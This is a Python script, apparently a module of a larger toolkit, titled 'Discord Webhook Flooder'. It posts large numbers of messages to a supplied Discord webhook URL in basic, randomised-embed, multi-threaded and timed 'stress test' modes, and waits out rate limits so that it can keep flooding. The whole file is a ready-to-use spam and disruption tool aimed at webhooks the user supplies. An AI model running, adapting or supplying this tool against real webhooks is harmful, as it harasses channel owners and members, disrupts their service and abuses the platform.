from Config.Util import *
from Config.Config import *
try:
    import requests
    import json
    import threading
    import time
    import random
    import string
except Exception as e:
    ErrorModule(e)

Title("Discord Webhook Flooder")

try:
    def generate_random_message(length=50):
        """Generate random message content"""
        return ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=length))

    def generate_random_embed():
        """Generate random embed content"""
        colors = [0xff0000, 0x00ff00, 0x0000ff, 0xffff00, 0xff00ff, 0x00ffff, 0xffffff]
        
        return {
            'title': generate_random_message(20),
            'description': generate_random_message(100),
            'color': random.choice(colors),
            'fields': [
                {
                    'name': generate_random_message(15),
                    'value': generate_random_message(30),
                    'inline': random.choice([True, False])
                }
            ],
            'footer': {
                'text': generate_random_message(20)
            }
        }

    def flood_webhook_basic(webhook_url, message, count, delay):
        """Basic webhook flooding"""
        headers = {'Content-Type': 'application/json'}
        
        for i in range(count):
            try:
                payload = {
                    'content': message,
                    'username': username_webhook,
                    'avatar_url': avatar_webhook
                }
                
                response = requests.post(webhook_url, headers=headers, data=json.dumps(payload), timeout=5)
                
                if response.status_code == 204:
                    print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Message {white}{i+1}/{count}{green} sent successfully")
                elif response.status_code == 429:
                    rate_limit = response.json().get('retry_after', 1)
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Rate limited, waiting {white}{rate_limit}{red}s...")
                    time.sleep(rate_limit)
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Failed to send message {white}{i+1}{red}: HTTP {response.status_code}")
                
                time.sleep(delay)
                
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error sending message {white}{i+1}{red}: {e}")

    def flood_webhook_advanced(webhook_url, count, delay, use_embeds=False, use_random=False):
        """Advanced webhook flooding with embeds and random content"""
        headers = {'Content-Type': 'application/json'}
        
        def send_flood_message():
            for i in range(count):
                try:
                    if use_random:
                        message_content = generate_random_message()
                        username = generate_random_message(15)
                    else:
                        message_content = f"Flood message #{i+1}"
                        username = username_webhook
                    
                    payload = {
                        'content': message_content,
                        'username': username,
                        'avatar_url': avatar_webhook
                    }
                    
                    if use_embeds:
                        payload['embeds'] = [generate_random_embed()]
                    
                    response = requests.post(webhook_url, headers=headers, data=json.dumps(payload), timeout=5)
                    
                    if response.status_code == 204:
                        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Flood message {white}{i+1}/{count}{green} sent")
                    elif response.status_code == 429:
                        rate_limit = response.json().get('retry_after', 1)
                        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Rate limited, waiting {white}{rate_limit}{red}s...")
                        time.sleep(rate_limit)
                    else:
                        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Failed: HTTP {response.status_code}")
                    
                    time.sleep(delay)
                    
                except Exception as e:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error: {white}{e}")
        
        send_flood_message()

    def flood_webhook_threaded(webhook_url, message, threads_count, messages_per_thread, delay):
        """Multi-threaded webhook flooding"""
        def thread_flood(thread_id):
            headers = {'Content-Type': 'application/json'}
            
            for i in range(messages_per_thread):
                try:
                    payload = {
                        'content': f"{message} [Thread {thread_id}, Message {i+1}]",
                        'username': f"{username_webhook} T{thread_id}",
                        'avatar_url': avatar_webhook
                    }
                    
                    response = requests.post(webhook_url, headers=headers, data=json.dumps(payload), timeout=5)
                    
                    if response.status_code == 204:
                        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} T{white}{thread_id}{green} M{white}{i+1}{green} sent")
                    elif response.status_code == 429:
                        rate_limit = response.json().get('retry_after', 1)
                        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} T{white}{thread_id}{red} rate limited: {white}{rate_limit}s")
                        time.sleep(rate_limit)
                    else:
                        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} T{white}{thread_id}{red} failed: HTTP {response.status_code}")
                    
                    time.sleep(delay)
                    
                except Exception as e:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} T{white}{thread_id}{red} error: {e}")
        
        threads = []
        for i in range(threads_count):
            thread = threading.Thread(target=thread_flood, args=(i+1,))
            threads.append(thread)
            thread.start()
            time.sleep(0.1)  # Stagger thread starts
        
        for thread in threads:
            thread.join()

    def webhook_stress_test(webhook_url, duration_minutes):
        """Stress test webhook for specified duration"""
        end_time = time.time() + (duration_minutes * 60)
        message_count = 0
        
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Starting {white}{duration_minutes}{red} minute stress test...")
        
        while time.time() < end_time:
            try:
                headers = {'Content-Type': 'application/json'}
                payload = {
                    'content': f"Stress test message #{message_count + 1} - {current_time_hour()}",
                    'username': f"{username_webhook} StressTest",
                    'avatar_url': avatar_webhook
                }
                
                response = requests.post(webhook_url, headers=headers, data=json.dumps(payload), timeout=5)
                message_count += 1
                
                if response.status_code == 204:
                    print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Stress message {white}{message_count}{green} sent")
                elif response.status_code == 429:
                    rate_limit = response.json().get('retry_after', 1)
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Rate limited: {white}{rate_limit}s")
                    time.sleep(rate_limit)
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} HTTP {response.status_code}")
                
                time.sleep(0.1)  # Small delay
                
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error: {white}{e}")
                time.sleep(1)
        
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Stress test completed. Total messages: {white}{message_count}")

    webhook_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {reset}")
    CheckWebhook(webhook_url)
    
    print(f"""
 {BEFORE}01{AFTER}{white} Basic flood
 {BEFORE}02{AFTER}{white} Advanced flood (embeds + random)
 {BEFORE}03{AFTER}{white} Multi-threaded flood
 {BEFORE}04{AFTER}{white} Stress test (time-based)
    """)
    
    flood_type = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Flood type -> {reset}")
    
    if flood_type in ['1', '01']:
        message = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Message to flood -> {reset}")
        try:
            count = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Number of messages -> {reset}"))
            delay = float(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Delay between messages (seconds) -> {reset}"))
        except:
            ErrorNumber()
        
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Starting basic flood...")
        flood_webhook_basic(webhook_url, message, count, delay)
    
    elif flood_type in ['2', '02']:
        try:
            count = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Number of messages -> {reset}"))
            delay = float(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Delay between messages (seconds) -> {reset}"))
        except:
            ErrorNumber()
        
        use_embeds = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Use embeds? (y/n) -> {reset}").lower() in ['y', 'yes']
        use_random = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Use random content? (y/n) -> {reset}").lower() in ['y', 'yes']
        
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Starting advanced flood...")
        flood_webhook_advanced(webhook_url, count, delay, use_embeds, use_random)
    
    elif flood_type in ['3', '03']:
        message = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Base message -> {reset}")
        try:
            threads_count = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Number of threads -> {reset}"))
            messages_per_thread = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Messages per thread -> {reset}"))
            delay = float(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Delay between messages (seconds) -> {reset}"))
        except:
            ErrorNumber()
        
        total_messages = threads_count * messages_per_thread
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Total messages to send: {white}{total_messages}")
        
        confirm = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Continue? (y/n) -> {reset}")
        if confirm.lower() in ['y', 'yes']:
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Starting multi-threaded flood...")
            flood_webhook_threaded(webhook_url, message, threads_count, messages_per_thread, delay)
    
    elif flood_type in ['4', '04']:
        try:
            duration = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Duration in minutes -> {reset}"))
        except:
            ErrorNumber()
        
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} {yellow}This will flood for {duration} minutes continuously")
        confirm = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Continue? (y/n) -> {reset}")
        
        if confirm.lower() in ['y', 'yes']:
            webhook_stress_test(webhook_url, duration)
    
    else:
        ErrorChoice()

    Continue()
    Reset()
except Exception as e:
    Error(e)